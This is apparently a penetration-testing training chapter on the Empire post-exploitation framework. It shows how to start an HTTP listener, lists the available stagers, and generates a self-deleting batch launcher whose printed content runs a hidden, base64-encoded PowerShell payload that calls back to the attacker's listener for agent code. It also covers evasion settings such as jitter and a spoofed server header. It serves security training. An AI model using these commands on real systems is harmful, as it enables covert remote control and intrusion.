We'll begin our tour of Empire with a brief discussion of listeners and stagers. Equivalent to Metasploit's multi/handler, listeners accept inbound connections from various Empire agents.

Stagers are small pieces of code generated by Empire that are executed on the victim and connect back to a listener. They set up a connection between the victim and the attacker and perform additional tasks to facilitate the transfer of a staged payload.

To begin an Empire session, we will first enter the listeners context, then print available listeners with uselistener followed by a T and a double A to engage Empire's tab completion feature.

```
(Empire) > listeners
[!] No listeners currently active 

(Empire: listeners) > uselistener 
dbx           http_com      http_hop      meterpreter   
http          http_foreign  http_mapi     redirector    
```

The _http_ listener is the most basic listener and like the windows/meterpreter/reverse_http payload in Metasploit, communicates through a series of HTTP GET and POST requests to simulate legitimate HTTP traffic.

The _redirector_ listener is also worth mentioning as it creates a _pivot_ that enables communications with an internal network through a compromised host.

Once we've chosen a listener, we can run the uselistener command to select it and info to display information and syntax:

```
(Empire: listeners) > uselistener http

(Empire: listeners/http) > info

    Name: HTTP[S]
Category: client_server

Authors:
  @harmj0y

Description:
  Starts a http[s] listener (PowerShell or Python) that uses a
  GET/POST approach.

HTTP[S] Options:

Name              Required    Value                            Description
----              --------    -------                          -----------
...
KillDate          False                                        Date for the listener to exit (MM/dd/yyyy).
Name              True        http                             Name for the listener.
Launcher          True        powershell -noP -sta -w 1 -enc   Launcher string.
DefaultDelay      True        5                                Agent delay/reach back interval (in seconds).
DefaultLostLimit  True        60                               Number of missed checkins before exiting
WorkingHours      False                                        Hours for the agent to operate (09:00-17:00).
...
Host              True        http://10.11.0.4:80        Hostname/IP for staging.
CertPath          False                                        Certificate path for https listeners.
DefaultJitter     True        0.0                              Jitter in agent reachback interval (0.0-1.0).
Proxy             False       default                          Proxy to use for request (default, none, or other).
...
BindIP            True        0.0.0.0                          The IP to bind to on the control server.
Port              True        80                               Port for the listener.
ServerVersion     True        Microsoft-IIS/7.5                Server header for the control server.
...
```

As shown in the above listing, there are many options, but most are already set or are optional. The most important parameters are _Host_ and _Port_, which are used to select the local IP address or hostname and the port number of the listener, respectively. We can set the _Host_ as follows:

```
(Empire: listeners) > set Host 10.11.0.4
(Empire: listeners) >
```

There are additional settings worth noting. _DefaultDelay_ attempts to simulate more legitimate HTTP traffic by setting the wait interval callback time from the compromised host to the listener. _DefaultJitter_ makes the traffic seem less programmatically generated by setting _DefaultDelay_ to a random offset. _KillDate_ will self-terminate the listeners on all compromised hosts on the specified date. This is especially useful when performing cleanup after a penetration test.

Once the options are set, we can start the listener with the execute command and return to the main listener menu with back. Lastly, we can list all available stagers with usestager followed by T and double A.

```
(Empire: listeners/http) > execute
[*] Starting listener 'http'
 * Serving Flask app "http" (lazy loading)
 * Environment: production
   WARNING: Do not use the development server in a production environment.
   Use a production WSGI server instead.
 * Debug mode: off
[+] Listener successfully started!

(Empire: listeners/http) > back

(Empire: listeners) > usestager 
multi/bash                osx/launcher              windows/launcher_bat
multi/launcher            osx/macho                 windows/launcher_lnk
multi/macro               osx/macro                 windows/launcher_sct
multi/pyinstaller         osx/pkg                   windows/launcher_vbs
multi/war                 osx/safari_launcher       windows/launcher_xml
osx/applescript           osx/teensy                windows/macro
osx/application           windows/bunny             windows/macroless_msword
osx/ducky                 windows/dll               windows/teensy
osx/dylib                 windows/ducky             
osx/jar                   windows/hta               
```

As shown above, Empire supports stagers for Windows, Linux, and OS X. Windows stagers include support for standard DLLs, HTLM Applications, Microsoft Office macros, and more exotic stagers such as _windows/ducky_ for use with the USB Rubber Ducky.

To get an idea of how this works, let's try out the _windows/launcher_bat_ stager. After selecting the stager, we can review the options with the info command.

```
(Empire: listeners) > usestager windows/launcher_bat

(Empire: stager/windows/launcher_bat) > info

Name: BAT Launcher

Description:
  Generates a self-deleting .bat launcher for
  Empire.

Options:

  Name             Required    Value             Description
  ----             --------    -------           -----------
  Listener         True                          Listener to generate stager for.
  OutFile          False       /tmp/launcher.bat File to output .bat launcher to,
                                                 otherwise displayed on the screen.
  Obfuscate        False       False             Switch. Obfuscate the launcher
                                                 powershell code, uses the
                                                 ObfuscateCommand for obfuscation type
                                                 For powershell only.
  ObfuscateCommand False       Token\All\1,Launcher\STDIN++\12467The Invoke-Obfuscatio
                                                 Only used if Obfuscate switch is True
                                                 For powershell only.
  Language         True        powershell        Language of the stager to generate.
  ProxyCreds       False       default           Proxy credentials
                                                 ([domain\]username:password) to use f
                                                 request (default, none, or other).
  UserAgent        False       default           User-agent string to use for the stag
                                                 request (default, none, or other).
  Proxy            False       default           Proxy to use for request (default, no
                                                 or other).
  Delete           False       True              Switch. Delete .bat after running.
  StagerRetries    False       0                 Times for the stager to retry
                                                 connecting.
```

We can configure the _Listener_ parameter with the set command followed by the name of the listener we just created. Finally, we'll create the stager with execute as shown below.

```
Empire: stager/windows/launcher_bat) > set Listener http

(Empire: stager/windows/launcher_bat) > execute

[*] Stager output written out to: /tmp/launcher.bat

(Empire: stager/windows/launcher_bat) > 
```

To better understand the stager we just created, let's take a look at the partial content of the generated launcher.bat file.

```
kali@kali:/opt/Empire$ cat /tmp/launcher.bat 
@echo off
start /b powershell -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBlAHIAcwBp...
start /b "" cmd /c del "%~f0"&exit /b
```

The stager is a base64-encoded PowerShell command string. This first-stage payload will connect to the listener and fetch the rest of the Empire agent code.